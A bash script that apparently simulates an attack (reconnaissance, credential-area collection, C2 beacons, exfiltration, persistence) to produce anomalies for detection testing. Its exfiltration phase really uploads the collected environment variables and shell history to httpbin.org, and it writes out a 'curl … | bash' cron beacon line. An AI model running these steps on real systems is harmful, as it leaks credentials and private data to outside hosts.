#!/bin/bash
# Simulate a realistic attack scenario for testing offline analysis
# This includes: reconnaissance, data collection, and exfiltration attempts

set -e

echo "[ATTACK SIMULATION] Starting attack scenario..."
echo "[!] This is for TESTING ONLY - simulates malicious activity patterns"
echo ""

DURATION=${1:-45}  # Default 45 seconds
echo "[+] Scenario duration: ${DURATION} seconds"

START_TIME=$(date +%s)
END_TIME=$((START_TIME + DURATION))

# Create temporary directories
STAGING_DIR=$(mktemp -d)
echo "[+] Staging directory: $STAGING_DIR"

# Phase 1: Reconnaissance (first 15 seconds)
phase1_reconnaissance() {
    echo ""
    echo "=== PHASE 1: Reconnaissance ==="

    # System information gathering
    echo "[*] Gathering system information..."
    uname -a > "$STAGING_DIR/sysinfo.txt"
    cat /etc/os-release >> "$STAGING_DIR/sysinfo.txt" 2>/dev/null || true
    whoami >> "$STAGING_DIR/sysinfo.txt"
    id >> "$STAGING_DIR/sysinfo.txt"

    # Network configuration
    echo "[*] Mapping network configuration..."
    ip addr show > "$STAGING_DIR/network.txt" 2>/dev/null || ifconfig > "$STAGING_DIR/network.txt" 2>/dev/null || true
    ip route show >> "$STAGING_DIR/network.txt" 2>/dev/null || route -n >> "$STAGING_DIR/network.txt" 2>/dev/null || true

    # Running processes
    echo "[*] Enumerating processes..."
    ps aux > "$STAGING_DIR/processes.txt"

    # Network connections
    echo "[*] Checking network connections..."
    ss -tunap > "$STAGING_DIR/connections.txt" 2>/dev/null || netstat -tunap > "$STAGING_DIR/connections.txt" 2>/dev/null || true

    sleep 3
}

# Phase 2: Data Collection (next 15 seconds)
phase2_data_collection() {
    echo ""
    echo "=== PHASE 2: Data Collection ==="

    # Search for sensitive files
    echo "[*] Searching for sensitive data..."

    # SSH keys (common target)
    if [ -d "$HOME/.ssh" ]; then
        ls -la "$HOME/.ssh" > "$STAGING_DIR/ssh_keys.txt" 2>/dev/null || true
        # Don't actually copy keys, just list them
        echo "Found SSH directory" >> "$STAGING_DIR/sensitive_files.txt"
    fi

    # Browser data (cookies, history)
    echo "[*] Checking browser data locations..."
    if [ -d "$HOME/.mozilla" ]; then
        echo "Firefox profile found" >> "$STAGING_DIR/sensitive_files.txt"
    fi
    if [ -d "$HOME/.config/google-chrome" ]; then
        echo "Chrome profile found" >> "$STAGING_DIR/sensitive_files.txt"
    fi

    # Environment variables (might contain credentials)
    echo "[*] Collecting environment..."
    env > "$STAGING_DIR/environment.txt"

    # Command history
    if [ -f "$HOME/.bash_history" ]; then
        tail -n 50 "$HOME/.bash_history" > "$STAGING_DIR/history.txt" 2>/dev/null || true
    fi

    # Create fake "stolen" data file
    echo "[*] Aggregating collected data..."
    cat "$STAGING_DIR"/*.txt > "$STAGING_DIR/collected_data.txt" 2>/dev/null || true
    DATA_SIZE=$(du -h "$STAGING_DIR/collected_data.txt" 2>/dev/null | cut -f1)
    echo "[*] Collected data size: $DATA_SIZE"

    sleep 3
}

# Phase 3: Command & Control Communication (next 10 seconds)
phase3_c2_communication() {
    echo ""
    echo "=== PHASE 3: Command & Control ==="

    # DNS queries to suspicious domains
    echo "[*] Attempting C2 communications..."

    # Simulate DNS tunneling attempts
    for i in {1..3}; do
        nslookup "beacon${i}.example-c2-server.com" > /dev/null 2>&1 || true
        sleep 0.5
    done

    # HTTP/HTTPS beacons to external servers
    echo "[*] Sending beacon signals..."

    # Httpbin for testing (legitimate but simulates C2)
    curl -s -X POST https://httpbin.org/post \
        -H "User-Agent: Mozilla/5.0" \
        -d "status=ready&host=$(hostname)" \
        > /dev/null 2>&1 || true

    # Pastebin-like service (common exfil method)
    curl -s -X POST https://httpbin.org/anything \
        -H "Content-Type: application/json" \
        -d '{"action":"checkin","timestamp":"'$(date +%s)'"}' \
        > /dev/null 2>&1 || true

    sleep 2
}

# Phase 4: Data Exfiltration (final phase)
phase4_exfiltration() {
    echo ""
    echo "=== PHASE 4: Data Exfiltration ==="

    echo "[*] Preparing data for exfiltration..."

    # Compress collected data
    if [ -f "$STAGING_DIR/collected_data.txt" ]; then
        gzip -c "$STAGING_DIR/collected_data.txt" > "$STAGING_DIR/data.gz" 2>/dev/null || true
    fi

    # Simulate multiple exfiltration attempts
    echo "[*] Attempting data exfiltration..."

    # DNS exfiltration simulation (queries encode data)
    for i in {1..5}; do
        RANDOM_HEX=$(openssl rand -hex 8)
        nslookup "${RANDOM_HEX}.data-exfil.example.com" > /dev/null 2>&1 || true
        sleep 0.3
    done

    # HTTP upload (large POST request)
    echo "[*] HTTP exfiltration attempt..."
    if [ -f "$STAGING_DIR/data.gz" ]; then
        # Simulate upload to cloud storage
        curl -s -X POST https://httpbin.org/post \
            -F "file=@$STAGING_DIR/data.gz" \
            -F "key=exfil-$(date +%s)" \
            > /dev/null 2>&1 || true
    fi

    # Alternative exfil: HTTPS to suspicious port
    curl -s https://httpbin.org:443/anything \
        --data-binary "@$STAGING_DIR/collected_data.txt" \
        > /dev/null 2>&1 || true

    sleep 2
}

# Phase 5: Persistence & Cleanup (if time allows)
phase5_persistence_cleanup() {
    echo ""
    echo "=== PHASE 5: Covering Tracks ==="

    echo "[*] Attempting to establish persistence..."

    # Create a fake cron job (don't actually install it)
    CRON_ENTRY="*/5 * * * * curl -s https://example-c2.com/beacon | bash"
    echo "Would install cron: $CRON_ENTRY" > "$STAGING_DIR/persistence.txt"

    # Simulate log tampering attempts
    echo "[*] Attempting log cleanup..."

    # Try to read various logs (will show up in audit logs)
    tail -n 1 /var/log/auth.log > /dev/null 2>/dev/null || true
    tail -n 1 /var/log/syslog > /dev/null 2>/dev/null || true

    # Clear local traces
    echo "[*] Removing local artifacts..."
    rm -rf "$STAGING_DIR" 2>/dev/null || true

    sleep 2
}

# Execute attack phases
echo ""
echo "[ATTACK SIMULATION] Execution timeline:"
echo ""

CURRENT_TIME=$(date +%s)
PHASE=1

while [ $(date +%s) -lt $END_TIME ]; do
    ELAPSED=$(($(date +%s) - START_TIME))

    case $PHASE in
        1)
            if [ $ELAPSED -lt 15 ]; then
                phase1_reconnaissance
                PHASE=2
            fi
            ;;
        2)
            if [ $ELAPSED -ge 15 ] && [ $ELAPSED -lt 30 ]; then
                phase2_data_collection
                PHASE=3
            fi
            ;;
        3)
            if [ $ELAPSED -ge 30 ] && [ $ELAPSED -lt 40 ]; then
                phase3_c2_communication
                PHASE=4
            fi
            ;;
        4)
            if [ $ELAPSED -ge 40 ]; then
                phase4_exfiltration
                if [ $ELAPSED -gt 50 ]; then
                    phase5_persistence_cleanup
                fi
                PHASE=5
                break
            fi
            ;;
    esac

    sleep 1
done

echo ""
echo "[ATTACK SIMULATION] Scenario completed"
echo ""
echo "[+] Attack phases executed:"
echo "    1. ✓ Reconnaissance (system info, network mapping)"
echo "    2. ✓ Data Collection (sensitive files, credentials)"
echo "    3. ✓ C2 Communication (DNS tunneling, HTTP beacons)"
echo "    4. ✓ Data Exfiltration (DNS/HTTP upload attempts)"
echo "    5. ✓ Persistence & Cleanup (cron jobs, log tampering)"
echo ""
echo "[!] Expected anomalies in offline analysis:"
echo "    - Unusual port connections (httpbin.org:443)"
echo "    - High volume of DNS queries to suspicious domains"
echo "    - Large HTTP POST requests (data exfiltration)"
echo "    - Access to sensitive file locations"
echo "    - Multiple curl processes from single parent"
echo ""

# Cleanup if directory still exists
rm -rf "$STAGING_DIR" 2>/dev/null || true
